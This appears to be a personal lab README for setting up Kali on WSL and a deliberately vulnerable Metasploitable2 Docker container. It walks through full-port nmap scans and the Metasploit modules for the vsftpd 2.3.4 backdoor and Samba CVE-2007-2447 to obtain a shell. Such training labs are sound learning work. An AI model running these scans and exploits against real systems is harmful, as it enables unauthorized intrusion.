# Security Testing Environment

## links

 - Network Chuck - Setup Kali on WSL <https://www.youtube.com/watch?v=dgdOILL1184>
 - Kali in Docker - <https://www.kali.org/docs/containers/using-kali-docker-images/>
 - kex offical - <https://www.kali.org/docs/wsl/win-kex/>
 - 

## Setup Metasploitable Container using Docker

Install/setup zsh

```bash
apt install zsh zsh-syntax-highlighting zsh-autosuggestions
```


Docker Containers for Attacking

```bash
docker run -it --name metasploitable \
--hostname metasploitable \
-p 513:513 \
-p 514:514 \
-p 8009:8009 \
-p 6697:6697 \
-p 3306:3306 \
-p 1099:1099 \
-p 6667:6667 \
-p 139:139 \
-p 5900:5900 \
-p 111:111 \
-p 6000:6000 \
-p 3632:3632 \
-p 80:80 \
-p 43153:43153 \
-p 8787:8787 \
-p 8180:8180 \
-p 1524:1524 \
-p 21:21 \
-p 2222:22 \
-p 23:23 \
-p 5432:5432 \
-p 25:25 \
-p 445:445 \
-p 512:512 \
tleemcjr/metasploitable2 bash

# once started, run:
services.sh
```

## Setup Workstation

1. Instll Kali Linux using WSL
2. update/upgrade 
3. Install kali-win-kex

```bash
sudo apt update && \
sudo apt upgrade -y \
sudo apt install kali-win-kex

# launch gui environment
kex
```

## Install Metasploit

```bash
# Recommended way... didnt work
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall

# this route did work...
sudo apt-get install metasploit-framework postgresql
```

## Running Metasploit Console

```bash
msfconsole

# yes to setup new database first time
# no to creating web server - not required
```

### Scanning with Metasploit

nmap can be used to scan the target and obtain more information, often called reconnaissance. This can be done using nmap - make sure the package is installed.

```bash

# install the package at the bash prompt
sudo apt install nmap -y

# run this command at the msf console
db_nmap -v -T4 -PA -sV --version-all --osscan-guess -A -sS -Pn -p 1-65535 <ip address>
```

When the scan is done, you can run the "services" command to get the output of your scan. Here is a sample output.
![services](./images/services.png)

### vsftpd Exploit

This service is running on the metasploitable container and can be exploited using metasploit.

```bash
# search metasploit for vsftpd to see if it has anything it can use to exploit this service
search vsftpd

# load up the exploit in the console
use exploit/unix/ftp/vsftpd_234_backdoor

# The command prompt will change to:
# msf6 exploit(unix/ftp/vsftpd_234_backdoor) >

# use the info command to get more information on the attack
info

# Set the host and port
set RHOST <ipaddress>
set RPORT <port>

# run the exploit
run
```
Here is the output from the search:

![vsftpd](./images/vsftpd.png)

Here is the sample info for the exploit:

![vsftpdinfo](./images/vsftpdinfo.png)

### Samba Exploit

This is a quick review of Samba exploits. This service has more exploits available, which may require some additional work...

```bash
# search the metasploit database for exploits related to samba
search samba

# Rescan the service to get more information
nmap -PA -A -sV -sT -T4 --version-all -v -p <port num> <ip addr>
```

Here are the search results for Samba
![samba](./images/samba.png)

The second targeted nmap scan will give you more information about the service and the version running. This can be used to do more research about potential issues. Do some google searching on the exploit and find the CVE. The CVE can also be searched inside metasploit to find a targeted attack against that service.

```bash
# search for the CVE
search cve:2007-2447
```

![sambasearchinfo](./images/sambasearchinfo.png)

Run the exploit and see if you can get a shell on the remote machine.

